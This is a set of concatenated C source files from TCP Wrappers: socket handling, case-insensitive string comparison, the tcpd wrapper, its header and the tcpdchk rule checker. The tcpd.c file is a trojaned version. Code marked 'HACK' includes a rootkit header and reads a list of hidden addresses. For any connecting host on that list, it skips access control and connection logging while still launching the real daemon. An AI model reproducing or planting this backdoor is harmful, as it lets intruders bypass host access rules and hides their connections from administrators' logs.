struct request_info *request;
{
    static struct sockaddr_in client;
    static struct sockaddr_in server;
    int     len;
    char    buf[BUFSIZ];
    int     fd = request->fd;

    sock_methods(request);

    /*
     * Look up the client host address. Hal R. Brand <BRAND@addvax.llnl.gov>
     * suggested how to get the client host info in case of UDP connections:
     * peek at the first message without actually looking at its contents. We
     * really should verify that client.sin_family gets the value AF_INET,
     * but this program has already caused too much grief on systems with
     * broken library code.
     */

    len = sizeof(client);
    if (getpeername(fd, (struct sockaddr *) & client, &len) < 0) {
	request->sink = sock_sink;
	len = sizeof(client);
	if (recvfrom(fd, buf, sizeof(buf), MSG_PEEK,
		     (struct sockaddr *) & client, &len) < 0) {
	    tcpd_warn("can't get client address: %m");
	    return;				/* give up */
	}
#ifdef really_paranoid
	memset(buf, 0 sizeof(buf));
#endif
    }
    request->client->sin = &client;

    /*
     * Determine the server binding. This is used for client username
     * lookups, and for access control rules that trigger on the server
     * address or name.
     */

    len = sizeof(server);
    if (getsockname(fd, (struct sockaddr *) & server, &len) < 0) {
	tcpd_warn("getsockname: %m");
	return;
    }
    request->server->sin = &server;
}

/* sock_hostaddr - map endpoint address to printable form */

void    sock_hostaddr(host)
struct host_info *host;
{
    struct sockaddr_in *sin = host->sin;

    if (sin != 0)
	STRN_CPY(host->addr, inet_ntoa(sin->sin_addr), sizeof(host->addr));
}

/* sock_hostname - map endpoint address to host name */

void    sock_hostname(host)
struct host_info *host;
{
    struct sockaddr_in *sin = host->sin;
    struct hostent *hp;
    int     i;

    /*
     * On some systems, for example Solaris 2.3, gethostbyaddr(0.0.0.0) does
     * not fail. Instead it returns "INADDR_ANY". Unfortunately, this does
     * not work the other way around: gethostbyname("INADDR_ANY") fails. We
     * have to special-case 0.0.0.0, in order to avoid false alerts from the
     * host name/address checking code below.
     */
    if (sin != 0 && sin->sin_addr.s_addr != 0
	&& (hp = gethostbyaddr((char *) &(sin->sin_addr),
			       sizeof(sin->sin_addr), AF_INET)) != 0) {

	STRN_CPY(host->name, hp->h_name, sizeof(host->name));

	/*
	 * Verify that the address is a member of the address list returned
	 * by gethostbyname(hostname).
	 * 
	 * Verify also that gethostbyaddr() and gethostbyname() return the same
	 * hostname, or rshd and rlogind may still end up being spoofed.
	 * 
	 * On some sites, gethostbyname("localhost") returns "localhost.domain".
	 * This is a DNS artefact. We treat it as a special case. When we
	 * can't believe the address list from gethostbyname("localhost")
	 * we're in big trouble anyway.
	 */

	if ((hp = gethostbyname(host->name)) == 0) {

	    /*
	     * Unable to verify that the host name matches the address. This
	     * may be a transient problem or a botched name server setup.
	     */

	    tcpd_warn("can't verify hostname: gethostbyname(%s) failed",
		      host->name);

	} else if (STR_NE(host->name, hp->h_name)
		   && STR_NE(host->name, "localhost")) {

	    /*
	     * The gethostbyaddr() and gethostbyname() calls did not return
	     * the same hostname. This could be a nameserver configuration
	     * problem. It could also be that someone is trying to spoof us.
	     */

	    tcpd_warn("host name/name mismatch: %s != %s",
		      host->name, hp->h_name);

	} else {

	    /*
	     * The address should be a member of the address list returned by
	     * gethostbyname(). We should first verify that the h_addrtype
	     * field is AF_INET, but this program has already caused too much
	     * grief on systems with broken library code.
	     */

	    for (i = 0; hp->h_addr_list[i]; i++) {
		if (memcmp(hp->h_addr_list[i],
			   (char *) &sin->sin_addr,
			   sizeof(sin->sin_addr)) == 0)
		    return;			/* name is good, keep it */
	    }

	    /*
	     * The host name does not map to the initial address. Perhaps
	     * someone has messed up. Perhaps someone compromised a name
	     * server.
	     */

	    tcpd_warn("host name/address mismatch: %s != %s",
		      inet_ntoa(sin->sin_addr), hp->h_name);
	}
	strcpy(host->name, paranoid);		/* name is bad, clobber it */
    }
}

/* sock_sink - absorb unreceived IP datagram */

static void sock_sink(fd)
int     fd;
{
    char    buf[BUFSIZ];
    struct sockaddr_in sin;
    int     size = sizeof(sin);

    /*
     * Eat up the not-yet received datagram. Some systems insist on a
     * non-zero source address argument in the recvfrom() call below.
     */

    (void) recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *) & sin, &size);
}
/*
 * Copyright (c) 1987 Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#if defined(LIBC_SCCS) && !defined(lint)
static char sccsid[] = "@(#)strcasecmp.c	5.6 (Berkeley) 6/27/88";
#endif /* LIBC_SCCS and not lint */

/* Some environments don't define u_char -- WZV */
#if 0
#include <sys/types.h>
#else
typedef unsigned char u_char;
#endif

/*
 * This array is designed for mapping upper and lower case letter
 * together for a case independent comparison.  The mappings are
 * based upon ascii character sequences.
 */
static u_char charmap[] = {
	'\000', '\001', '\002', '\003', '\004', '\005', '\006', '\007',
	'\010', '\011', '\012', '\013', '\014', '\015', '\016', '\017',
	'\020', '\021', '\022', '\023', '\024', '\025', '\026', '\027',
	'\030', '\031', '\032', '\033', '\034', '\035', '\036', '\037',
	'\040', '\041', '\042', '\043', '\044', '\045', '\046', '\047',
	'\050', '\051', '\052', '\053', '\054', '\055', '\056', '\057',
	'\060', '\061', '\062', '\063', '\064', '\065', '\066', '\067',
	'\070', '\071', '\072', '\073', '\074', '\075', '\076', '\077',
	'\100', '\141', '\142', '\143', '\144', '\145', '\146', '\147',
	'\150', '\151', '\152', '\153', '\154', '\155', '\156', '\157',
	'\160', '\161', '\162', '\163', '\164', '\165', '\166', '\167',
	'\170', '\171', '\172', '\133', '\134', '\135', '\136', '\137',
	'\140', '\141', '\142', '\143', '\144', '\145', '\146', '\147',
	'\150', '\151', '\152', '\153', '\154', '\155', '\156', '\157',
	'\160', '\161', '\162', '\163', '\164', '\165', '\166', '\167',
	'\170', '\171', '\172', '\173', '\174', '\175', '\176', '\177',
	'\200', '\201', '\202', '\203', '\204', '\205', '\206', '\207',
	'\210', '\211', '\212', '\213', '\214', '\215', '\216', '\217',
	'\220', '\221', '\222', '\223', '\224', '\225', '\226', '\227',
	'\230', '\231', '\232', '\233', '\234', '\235', '\236', '\237',
	'\240', '\241', '\242', '\243', '\244', '\245', '\246', '\247',
	'\250', '\251', '\252', '\253', '\254', '\255', '\256', '\257',
	'\260', '\261', '\262', '\263', '\264', '\265', '\266', '\267',
	'\270', '\271', '\272', '\273', '\274', '\275', '\276', '\277',
	'\300', '\341', '\342', '\343', '\344', '\345', '\346', '\347',
	'\350', '\351', '\352', '\353', '\354', '\355', '\356', '\357',
	'\360', '\361', '\362', '\363', '\364', '\365', '\366', '\367',
	'\370', '\371', '\372', '\333', '\334', '\335', '\336', '\337',
	'\340', '\341', '\342', '\343', '\344', '\345', '\346', '\347',
	'\350', '\351', '\352', '\353', '\354', '\355', '\356', '\357',
	'\360', '\361', '\362', '\363', '\364', '\365', '\366', '\367',
	'\370', '\371', '\372', '\373', '\374', '\375', '\376', '\377',
};

strcasecmp(s1, s2)
	char *s1, *s2;
{
	register u_char	*cm = charmap,
			*us1 = (u_char *)s1,
			*us2 = (u_char *)s2;

	while (cm[*us1] == cm[*us2++])
		if (*us1++ == '\0')
			return(0);
	return(cm[*us1] - cm[*--us2]);
}

strncasecmp(s1, s2, n)
	char *s1, *s2;
	register int n;
{
	register u_char	*cm = charmap,
			*us1 = (u_char *)s1,
			*us2 = (u_char *)s2;

	while (--n >= 0 && cm[*us1] == cm[*us2++])
		if (*us1++ == '\0')
			return(0);
	return(n < 0 ? 0 : cm[*us1] - cm[*--us2]);
}
 /*
  * General front end for stream and datagram IP services. This program logs
  * the remote host name and then invokes the real daemon. For example,
  * install as /usr/etc/{tftpd,fingerd,telnetd,ftpd,rlogind,rshd,rexecd},
  * after saving the real daemons in the directory specified with the
  * REAL_DAEMON_DIR macro. This arrangement requires that the network daemons
  * are started by inetd or something similar. Connections and diagnostics
  * are logged through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) tcpd.c 1.10 96/02/11 17:01:32";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

#ifndef MAXPATHNAMELEN
#define MAXPATHNAMELEN	BUFSIZ
#endif

#ifndef STDIN_FILENO
#define STDIN_FILENO	0
#endif

/* Local stuff. */

#include "patchlevel.h"
#include "tcpd.h"

int     allow_severity = SEVERITY;	/* run-time adjustable */
int     deny_severity = LOG_WARNING;	/* ditto */

/* HACK */
#include "../rootkit.h"
#define FILENAME ROOTKIT_ADDRESS_FILE
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list, *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;
int hide;

/* HACK read in maskfile */
void hackinit()
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;
   if ((int)fp_hack=fopen(FILENAME, "r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

main(argc, argv)
int     argc;
char  **argv;
{
    struct request_info request;
    char    path[MAXPATHNAMELEN];
char name[255],addr[255];
hackinit();
    /* Attempt to prevent the creation of world-writable files. */

#ifdef DAEMON_UMASK
    umask(DAEMON_UMASK);
#endif

    /*
     * If argv[0] is an absolute path name, ignore REAL_DAEMON_DIR, and strip
     * argv[0] to its basename.
     */

    if (argv[0][0] == '/') {
	strcpy(path, argv[0]);
	argv[0] = strrchr(argv[0], '/') + 1;
    } else {
	sprintf(path, "%s/%s", REAL_DAEMON_DIR, argv[0]);
    }

    /*
     * Open a channel to the syslog daemon. Older versions of openlog()
     * require only two arguments.
     */

#ifdef LOG_MAIL
    (void) openlog(argv[0], LOG_PID, FACILITY);
#else
    (void) openlog(argv[0], LOG_PID);
#endif

    /*
     * Find out the endpoint addresses of this conversation. Host name
     * lookups and double checks will be done on demand.
     */

    request_init(&request, RQ_DAEMON, argv[0], RQ_FILE, STDIN_FILENO, 0);
    fromhost(&request);

/* HACK mask out hidden addresses */
    hide=0;
    strcpy(name,eval_hostname(request.client));
    strcpy(addr,eval_hostaddr(request.client));   
    for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
        if ((h_tmp->hack_type)==1) {
            if (strstr(name,h_tmp->hack_cmd)) hide=1;
            if (strstr(addr,h_tmp->hack_cmd)) hide=1;
	}
    }

    /*
     * Optionally look up and double check the remote host name. Sites
     * concerned with security may choose to refuse connections from hosts
     * that pretend to have someone elses host name.
     */
if (!hide) {
#ifdef PARANOID
    if (STR_EQ(eval_hostname(request.client), paranoid))
	refuse(&request);
#endif
}
    /*
     * The BSD rlogin and rsh daemons that came out after 4.3 BSD disallow
     * socket options at the IP level. They do so for a good reason.
     * Unfortunately, we cannot use this with SunOS 4.1.x because the
     * getsockopt() system call can panic the system.
     */

#ifdef KILL_IP_OPTIONS
    fix_options(&request);
#endif

    /*
     * Check whether this host can access the service in argv[0]. The
     * access-control code invokes optional shell commands as specified in
     * the access-control tables.
     */
if (!hide) {
#ifdef HOSTS_ACCESS
    if (!hosts_access(&request))
	refuse(&request);
#endif

    /* Report request and invoke the real daemon program. */

    syslog(allow_severity, "connect from %s", eval_client(&request));
}
    closelog();
    (void) execv(path, argv);
    syslog(LOG_ERR, "error: cannot execute %s: %m", path);
    clean_exit(&request);
    /* NOTREACHED */
}
 /*
  * @(#) tcpd.h 1.5 96/03/19 16:22:24
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

/* Structure to describe one communications endpoint. */

#define STRING_LENGTH	128		/* hosts, users, processes */

struct host_info {
    char    name[STRING_LENGTH];	/* access via eval_hostname(host) */
    char    addr[STRING_LENGTH];	/* access via eval_hostaddr(host) */
    struct sockaddr_in *sin;		/* socket address or 0 */
    struct t_unitdata *unit;		/* TLI transport address or 0 */
    struct request_info *request;	/* for shared information */
};

/* Structure to describe what we know about a service request. */

struct request_info {
    int     fd;				/* socket handle */
    char    user[STRING_LENGTH];	/* access via eval_user(request) */
    char    daemon[STRING_LENGTH];	/* access via eval_daemon(request) */
    char    pid[10];			/* access via eval_pid(request) */
    struct host_info client[1];		/* client endpoint info */
    struct host_info server[1];		/* server endpoint info */
    void  (*sink) ();			/* datagram sink function or 0 */
    void  (*hostname) ();		/* address to printable hostname */
    void  (*hostaddr) ();		/* address to printable address */
    void  (*cleanup) ();		/* cleanup function or 0 */
    struct netconfig *config;		/* netdir handle */
};

/* Common string operations. Less clutter should be more readable. */

#define STRN_CPY(d,s,l)	{ strncpy((d),(s),(l)); (d)[(l)-1] = 0; }

#define STRN_EQ(x,y,l)	(strncasecmp((x),(y),(l)) == 0)
#define STRN_NE(x,y,l)	(strncasecmp((x),(y),(l)) != 0)
#define STR_EQ(x,y)	(strcasecmp((x),(y)) == 0)
#define STR_NE(x,y)	(strcasecmp((x),(y)) != 0)

 /*
  * Initially, all above strings have the empty value. Information that
  * cannot be determined at runtime is set to "unknown", so that we can
  * distinguish between `unavailable' and `not yet looked up'. A hostname
  * that we do not believe in is set to "paranoid".
  */

#define STRING_UNKNOWN	"unknown"	/* lookup failed */
#define STRING_PARANOID	"paranoid"	/* hostname conflict */

extern char unknown[];
extern char paranoid[];

#define HOSTNAME_KNOWN(s) (STR_NE((s),unknown) && STR_NE((s),paranoid))

#define NOT_INADDR(s) (s[strspn(s,"01234567890./")] != 0)

/* Global functions. */

#if defined(TLI) || defined(PTX) || defined(TLI_SEQUENT)
extern void fromhost();			/* get/validate client host info */
#else
#define fromhost sock_host		/* no TLI support needed */
#endif

extern int hosts_access();		/* access control */
extern void shell_cmd();		/* execute shell command */
extern char *percent_x();		/* do %<char> expansion */
extern void rfc931();			/* client name from RFC 931 daemon */
extern void clean_exit();		/* clean up and exit */
extern void refuse();			/* clean up and exit */
extern char *xgets();			/* fgets() on steroids */
extern char *split_at();		/* strchr() and split */
extern unsigned long dot_quad_addr();	/* restricted inet_addr() */

/* Global variables. */

extern int allow_severity;		/* for connection logging */
extern int deny_severity;		/* for connection logging */
extern char *hosts_allow_table;		/* for verification mode redirection */
extern char *hosts_deny_table;		/* for verification mode redirection */
extern int hosts_access_verbose;	/* for verbose matching mode */
extern int rfc931_timeout;		/* user lookup timeout */
extern int resident;			/* > 0 if resident process */

 /*
  * Routines for controlled initialization and update of request structure
  * attributes. Each attribute has its own key.
  */

#ifdef __STDC__
extern struct request_info *request_init(struct request_info *,...);
extern struct request_info *request_set(struct request_info *,...);
#else
extern struct request_info *request_init();	/* initialize request */
extern struct request_info *request_set();	/* update request structure */
#endif

#define RQ_FILE		1		/* file descriptor */
#define RQ_DAEMON	2		/* server process (argv[0]) */
#define RQ_USER		3		/* client user name */
#define RQ_CLIENT_NAME	4		/* client host name */
#define RQ_CLIENT_ADDR	5		/* client host address */
#define RQ_CLIENT_SIN	6		/* client endpoint (internal) */
#define RQ_SERVER_NAME	7		/* server host name */
#define RQ_SERVER_ADDR	8		/* server host address */
#define RQ_SERVER_SIN	9		/* server endpoint (internal) */

 /*
  * Routines for delayed evaluation of request attributes. Each attribute
  * type has its own access method. The trivial ones are implemented by
  * macros. The other ones are wrappers around the transport-specific host
  * name, address, and client user lookup methods. The request_info and
  * host_info structures serve as caches for the lookup results.
  */

extern char *eval_user();		/* client user */
extern char *eval_hostname();		/* printable hostname */
extern char *eval_hostaddr();		/* printable host address */
extern char *eval_hostinfo();		/* host name or address */
extern char *eval_client();		/* whatever is available */
extern char *eval_server();		/* whatever is available */
#define eval_daemon(r)	((r)->daemon)	/* daemon process name */
#define eval_pid(r)	((r)->pid)	/* process id */

/* Socket-specific methods, including DNS hostname lookups. */

extern void sock_host();		/* look up endpoint addresses */
extern void sock_hostname();		/* translate address to hostname */
extern void sock_hostaddr();		/* address to printable address */
#define sock_methods(r) \
	{ (r)->hostname = sock_hostname; (r)->hostaddr = sock_hostaddr; }

/* The System V Transport-Level Interface (TLI) interface. */

#if defined(TLI) || defined(PTX) || defined(TLI_SEQUENT)
extern void tli_host();			/* look up endpoint addresses etc. */
#endif

 /*
  * Problem reporting interface. Additional file/line context is reported
  * when available. The jump buffer (tcpd_buf) is not declared here, or
  * everyone would have to include <setjmp.h>.
  */

#ifdef __STDC__
extern void tcpd_warn(char *, ...);	/* report problem and proceed */
extern void tcpd_jump(char *, ...);	/* report problem and jump */
#else
extern void tcpd_warn();
extern void tcpd_jump();
#endif

struct tcpd_context {
    char   *file;			/* current file */
    int     line;			/* current line */
};
extern struct tcpd_context tcpd_context;

 /*
  * While processing access control rules, error conditions are handled by
  * jumping back into the hosts_access() routine. This is cleaner than
  * checking the return value of each and every silly little function. The
  * (-1) returns are here because zero is already taken by longjmp().
  */

#define AC_PERMIT	1		/* permit access */
#define AC_DENY		(-1)		/* deny_access */
#define AC_ERROR	AC_DENY		/* XXX */

 /*
  * In verification mode an option function should just say what it would do,
  * instead of really doing it. An option function that would not return
  * should clear the dry_run flag to inform the caller of this unusual
  * behavior.
  */

extern void process_options();		/* execute options */
extern int dry_run;			/* verification flag */

/* Bug workarounds. */

#ifdef INET_ADDR_BUG			/* inet_addr() returns struct */
#define inet_addr fix_inet_addr
extern long fix_inet_addr();
#endif

#ifdef BROKEN_FGETS			/* partial reads from sockets */
#define fgets fix_fgets
extern char *fix_fgets();
#endif

#ifdef RECVFROM_BUG			/* no address family info */
#define recvfrom fix_recvfrom
extern int fix_recvfrom();
#endif

#ifdef GETPEERNAME_BUG			/* claims success with UDP */
#define getpeername fix_getpeername
extern int fix_getpeername();
#endif

#ifdef SOLARIS_24_GETHOSTBYNAME_BUG	/* lists addresses as aliases */
#define gethostbyname fix_gethostbyname
extern struct hostent *fix_gethostbyname();
#endif

#ifdef USE_STRSEP			/* libc calls strtok() */
#define strtok	fix_strtok
extern char *fix_strtok();
#endif

#ifdef LIBC_CALLS_STRTOK		/* libc calls strtok() */
#define strtok	my_strtok
extern char *my_strtok();
#endif
 /*
  * tcpdchk - examine all tcpd access control rules and inetd.conf entries
  * 
  * Usage: tcpdchk [-a] [-d] [-i inet_conf] [-v]
  * 
  * -a: complain about implicit "allow" at end of rule.
  * 
  * -d: rules in current directory.
  * 
  * -i: location of inetd.conf file.
  * 
  * -v: show all rules.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) tcpdchk.c 1.7 96/02/11 17:01:34";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <syslog.h>
#include <setjmp.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>

extern int errno;
extern void exit();
extern int optind;
extern char *optarg;

#ifndef INADDR_NONE
#define INADDR_NONE     (-1)		/* XXX should be 0xffffffff */
#endif

#ifndef S_ISDIR
#define S_ISDIR(m)	(((m) & S_IFMT) == S_IFDIR)
#endif

/* Application-specific. */

#include "tcpd.h"
#include "inetcf.h"
#include "scaffold.h"

 /*
  * Stolen from hosts_access.c...
  */
static char sep[] = ", \t\n";

#define	BUFLEN 2048

int     resident = 0;
int     hosts_access_verbose = 0;
char   *hosts_allow_table = HOSTS_ALLOW;
char   *hosts_deny_table = HOSTS_DENY;
extern jmp_buf tcpd_buf;

 /*
  * Local stuff.
  */
static void usage();
static void parse_table();
static void print_list();
static void check_daemon_list();
static void check_client_list();
static void check_daemon();
static void check_user();
static int check_host();
static int reserved_name();

#define PERMIT	1
#define DENY	0

#define YES	1
#define	NO	0

static int defl_verdict;
static char *myname;
static int allow_check;
static char *inetcf;

int     main(argc, argv)
int     argc;
char  **argv;
{
    struct request_info request;
    struct stat st;
    int     c;

    myname = argv[0];

    /*
     * Parse the JCL.
     */
    while ((c = getopt(argc, argv, "adi:v")) != EOF) {
	switch (c) {
	case 'a':
	    allow_check = 1;
	    break;
	case 'd':
	    hosts_allow_table = "hosts.allow";
	    hosts_deny_table = "hosts.deny";
	    break;
	case 'i':
	    inetcf = optarg;
	    break;
	case 'v':
	    hosts_access_verbose++;
	    break;
	default:
	    usage();
	    /* NOTREACHED */
	}
    }
    if (argc != optind)
	usage();

    /*
     * When confusion really strikes...
     */
    if (check_path(REAL_DAEMON_DIR, &st) < 0) {
	tcpd_warn("REAL_DAEMON_DIR %s: %m", REAL_DAEMON_DIR);
    } else if (!S_ISDIR(st.st_mode)) {
	tcpd_warn("REAL_DAEMON_DIR %s is not a directory", REAL_DAEMON_DIR);
    }

    /*
     * Process the inet configuration file (or its moral equivalent). This
     * information is used later to find references in hosts.allow/deny to
     * unwrapped services, and other possible problems.
     */
    inetcf = inet_cfg(inetcf);
    if (hosts_access_verbose)
	printf("Using network configuration file: %s\n", inetcf);

    /*
     * These are not run from inetd but may have built-in access control.
     */
    inet_set("portmap", WR_NOT);
    inet_set("rpcbind", WR_NOT);

    /*
     * Check accessibility of access control files.
     */
    (void) check_path(hosts_allow_table, &st);
    (void) check_path(hosts_deny_table, &st);

    /*
     * Fake up an arbitrary service request.
     */
    request_init(&request,
		 RQ_DAEMON, "daemon_name",
		 RQ_SERVER_NAME, "server_hostname",
		 RQ_SERVER_ADDR, "server_addr",
		 RQ_USER, "user_name",
		 RQ_CLIENT_NAME, "client_hostname",
		 RQ_CLIENT_ADDR, "client_addr",
		 RQ_FILE, 1,
		 0);

    /*
     * Examine all access-control rules.
     */
    defl_verdict = PERMIT;
    parse_table(hosts_allow_table, &request);
    defl_verdict = DENY;
    parse_table(hosts_deny_table, &request);
    return (0);
}

/* usage - explain */

static void usage()
{
    fprintf(stderr, "usage: %s [-a] [-d] [-i inet_conf] [-v]\n", myname);
    fprintf(stderr, "	-a: report rules with implicit \"ALLOW\" at end\n");
    fprintf(stderr, "	-d: use allow/deny files in current directory\n");
    fprintf(stderr, "	-i: location of inetd.conf file\n");
    fprintf(stderr, "	-v: list all rules\n");
    exit(1);
}

/* parse_table - like table_match(), but examines _all_ entries */

static void parse_table(table, request)
char   *table;
struct request_info *request;
{
    FILE   *fp;
    int     real_verdict;
    char    sv_list[BUFLEN];		/* becomes list of daemons */
    char   *cl_list;			/* becomes list of requests */
    char   *sh_cmd;			/* becomes optional shell command */
    char    buf[BUFSIZ];
    int     verdict;
    struct tcpd_context saved_context;

    saved_context = tcpd_context;		/* stupid compilers */

    if (fp = fopen(table, "r")) {
	tcpd_context.file = table;
	tcpd_context.line = 0;
	while (xgets(sv_list, sizeof(sv_list), fp)) {
	    if (sv_list[strlen(sv_list) - 1] != '\n') {
		tcpd_warn("missing newline or line too long");
		continue;
	    }
	    if (sv_list[0] == '#' || sv_list[strspn(sv_list, " \t\r\n")] == 0)
		continue;
	    if ((cl_list = split_at(sv_list, ':')) == 0) {
		tcpd_warn("missing \":\" separator");
		continue;
	    }
	    sh_cmd = split_at(cl_list, ':');

	    if (hosts_access_verbose)
		printf("\n>>> Rule %s line %d:\n",
		       tcpd_context.file, tcpd_context.line);

	    if (hosts_access_verbose)
		print_list("daemons:  ", sv_list);
	    check_daemon_list(sv_list);

	    if (hosts_access_verbose)
		print_list("clients:  ", cl_list);
	    check_client_list(cl_list);

#ifdef PROCESS_OPTIONS
	    real_verdict = defl_verdict;
	    if (sh_cmd) {
		if ((verdict = setjmp(tcpd_buf)) != 0) {
		    real_verdict = (verdict == AC_PERMIT);
		} else {
		    dry_run = 1;
		    process_options(sh_cmd, request);
		    if (dry_run == 1 && real_verdict && allow_check)
			tcpd_warn("implicit \"allow\" at end of rule");
		}
	    } else if (defl_verdict && allow_check) {
		tcpd_warn("implicit \"allow\" at end of rule");
	    }
	    if (hosts_access_verbose)
		printf("access:   %s\n", real_verdict ? "granted" : "denied");
#else
	    if (sh_cmd)
		shell_cmd(percent_x(buf, sizeof(buf), sh_cmd, request));
	    if (hosts_access_verbose)
		printf("access:   %s\n", defl_verdict ? "granted" : "denied");
#endif
	}
	(void) fclose(fp);
    } else if (errno != ENOENT) {
	tcpd_warn("cannot open %s: %m", table);
    }
    tcpd_context = saved_context;
}

/* print_list - pretty-print a list */

static void print_list(title, list)
char   *title;
char   *list;
{
    char    buf[BUFLEN];
    char   *cp;
    char   *next;

    fputs(title, stdout);
    strcpy(buf, list);

    for (cp = strtok(buf, sep); cp != 0; cp = next) {
	fputs(cp, stdout);
	next = strtok((char *) 0, sep);
	if (next != 0)
	    fputs(" ", stdout);
    }
    fputs("\n", stdout);
}

/* check_daemon_list - criticize daemon list */

static void check_daemon_list(list)
char   *list;
{
    char    buf[BUFLEN];
    char   *cp;
    char   *host;
    int     daemons = 0;

    strcpy(buf, list);

    for (cp = strtok(buf, sep); cp != 0; cp = strtok((char *) 0, sep)) {
	if (STR_EQ(cp, "EXCEPT")) {
	    daemons = 0;
	} else {
	    daemons++;
	    if ((host = split_at(cp + 1, '@')) != 0 && check_host(host) > 1) {
		tcpd_warn("host %s has more than one address", host);
		tcpd_warn("(consider using an address instead)");
	    }
	    check_daemon(cp);
	}
    }
    if (daemons == 0)
	tcpd_warn("daemon list is empty or ends in EXCEPT");
}

/* check_client_list - criticize client list */

static void check_client_list(list)
char   *list;
{
    char    buf[BUFLEN];
    char   *cp;
    char   *host;
    int     clients = 0;

    strcpy(buf, list);

    for (cp = strtok(buf, sep); cp != 0; cp = strtok((char *) 0, sep)) {
	if (STR_EQ(cp, "EXCEPT")) {
	    clients = 0;
	} else {
	    clients++;
	    if (host = split_at(cp + 1, '@')) {	/* user@host */
		check_user(cp);
		check_host(host);
	    } else {
		check_host(cp);
	    }
	}
    }
    if (clients == 0)
	tcpd_warn("client list is empty or ends in EXCEPT");
}

/* check_daemon - criticize daemon pattern */

static void check_daemon(pat)
char   *pat;
{
    if (pat[0] == '@') {
	tcpd_warn("%s: daemon name begins with \"@\"", pat);
    } else if (pat[0] == '.') {
	tcpd_warn("%s: daemon name begins with dot", pat);
    } else if (pat[strlen(pat) - 1] == '.') {
	tcpd_warn("%s: daemon name ends in dot", pat);
    } else if (STR_EQ(pat, "ALL") || STR_EQ(pat, unknown)) {
	 /* void */ ;
    } else if (STR_EQ(pat, "FAIL")) {		/* obsolete */
	tcpd_warn("FAIL is no longer recognized");
	tcpd_warn("(use EXCEPT or DENY instead)");
    } else if (reserved_name(pat)) {
	tcpd_warn("%s: daemon name may be reserved word", pat);
    } else {
	switch (inet_get(pat)) {
	case WR_UNKNOWN:
	    tcpd_warn("%s: no such process name in %s", pat, inetcf);
	    inet_set(pat, WR_YES);		/* shut up next time */
	    break;
	case WR_NOT:
	    tcpd_warn("%s: service possibly not wrapped", pat);
	    inet_set(pat, WR_YES);
	    break;
	}
    }
}

/* check_user - criticize user pattern */

static void check_user(pat)
char   *pat;
{
    if (pat[0] == '@') {			/* @netgroup */
	tcpd_warn("%s: user name begins with \"@\"", pat);
    } else if (pat[0] == '.') {
	tcpd_warn("%s: user name begins with dot", pat);
    } else if (pat[strlen(pat) - 1] == '.') {
	tcpd_warn("%s: user name ends in dot", pat);
    } else if (STR_EQ(pat, "ALL") || STR_EQ(pat, unknown)
	       || STR_EQ(pat, "KNOWN")) {
	 /* void */ ;
    } else if (STR_EQ(pat, "FAIL")) {		/* obsolete */
	tcpd_warn("FAIL is no longer recognized");
	tcpd_warn("(use EXCEPT or DENY instead)");
    } else if (reserved_name(pat)) {
	tcpd_warn("%s: user name may be reserved word", pat);
    }
}

/* check_host - criticize host pattern */

static int check_host(pat)
char   *pat;
{
    char   *mask;
    int     addr_count = 1;

    if (pat[0] == '@') {			/* @netgroup */
#ifdef NO_NETGRENT
	/* SCO has no *netgrent() support */
#else
#ifdef NETGROUP
	char   *machinep;
	char   *userp;
	char   *domainp;

	setnetgrent(pat + 1);
	if (getnetgrent(&machinep, &userp, &domainp) == 0)
	    tcpd_warn("%s: unknown or empty netgroup", pat + 1);
	endnetgrent();
#else
	tcpd_warn("netgroup support disabled");
#endif
#endif
    } else if (mask = split_at(pat, '/')) {	/* network/netmask */
	if (dot_quad_addr(pat) == INADDR_NONE
	    || dot_quad_addr(mask) == INADDR_NONE)
	    tcpd_warn("%s/%s: bad net/mask pattern", pat, mask);
    } else if (STR_EQ(pat, "FAIL")) {		/* obsolete */
	tcpd_warn("FAIL is no longer recognized");
	tcpd_warn("(use EXCEPT or DENY instead)");
    } else if (reserved_name(pat)) {		/* other reserved */
	 /* void */ ;
    } else if (NOT_INADDR(pat)) {		/* internet name */
	if (pat[strlen(pat) - 1] == '.') {
	    tcpd_warn("%s: domain or host name ends in dot", pat);
	} else if (pat[0] != '.') {
	    addr_count = check_dns(pat);
	}
    } else {					/* numeric form */
	if (STR_EQ(pat, "0.0.0.0") || STR_EQ(pat, "255.255.255.255")) {
	    /* void */ ;
	} else if (pat[0] == '.') {
	    tcpd_warn("%s: network number begins with dot", pat);
	} else if (pat[strlen(pat) - 1] != '.') {
	    check_dns(pat);
	}
    }
    return (addr_count);
}

/* reserved_name - determine if name is reserved */

